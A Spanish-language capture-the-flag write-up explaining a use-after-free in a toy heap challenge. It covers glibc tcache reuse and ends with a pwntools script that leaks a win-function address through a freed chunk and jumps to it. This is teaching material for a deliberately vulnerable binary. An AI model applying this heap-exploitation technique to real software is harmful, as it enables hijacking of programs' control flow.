Flujo del Programa

Este programa muestra un menu con las siguientes opciones:

  1. Crear en un indice un chunk de 0x20 y escribir datos
  2. Mostrar los primeros 8 bytes de un chunk
  3. Liberar un chunk, pero no borra su recerencia de los indices (¡UAF!).
  4. Saltar a una dirección de memoria.
  5. Salir del programa.
  6. Funcion Secreta: Aloca un chunk de 0x20 y escribe la dirección de win.

Aquí es muy claro ver el objetivo final, conseguir la dirección de win para saltar con jump. Y para conseguir esa direccion necesitamos tener control del chunk que aloca secret. ¿Cómo podemos hacer esto?

Use After Free

La clave está en que cuando liberamos un chunk no borra su referencia de los índices. Cuando hacemos free() de un chunk pequeño (como uno de tamaño 0x20), glibc no lo devuelve inmediatamente al sistema, sino que lo guarda en una estructura llamada tcache (thread cache).

La tcache funciona como una pila (LIFO, Last In First Out). Esto significa que el último chunk liberado de un determinado tamaño será el primero en ser reutilizado en una llamada posterior a malloc del mismo tamaño.

En la práctica, esto implica que si liberamos un chunk y luego hacemos otro malloc del mismo tamaño, recibiremos exactamente ese mismo chunk.

Más información sobre la tcache:

  • https://ir0nstone.gitbook.io/notes/binexp/heap/the-tcache
  • https://guyinatuxedo.github.io/29-tcache/tcache_explanation/index.html

Estrategia de Explotacion

La estrategia de explotación será la siguiente:

  1. Creamos un chunk (no hace falta escribir datos).
  2. Liberamos ese chunk.
  3. Llamamos a la función secreta para que al hacer malloc() reutilice ese chunk y escriba la dirección de win.
  4. Mostramos los datos de nuestro chunk anterior, para que nos muestre la dirección de win.
  5. Saltamos a win.

from pwn import *

p = process("./chall")

def create(idx, data):
    idx = str(idx).encode()
    p.sendline(b"1")
    p.sendline(idx)
    p.recvuntil(b"Data: ")
    p.sendline(data)

def secret():
    p.sendline(b"6")

def free(idx):
    idx = str(idx).encode()
    p.sendline(b"3")
    p.sendline(idx)

def getaddr(idx):
    idx = str(idx).encode()
    p.sendline(b"2")
    p.sendline(idx)
    p.recvuntil(b"Data: ")
    addr = p.recvline()[:-1]
    return addr

def jump(addr):
    p.sendline(b"4")
    p.sendline(addr)

create(1, b"A")
free(1)
secret()
win = getaddr(1)
jump(win)
p.interactive()
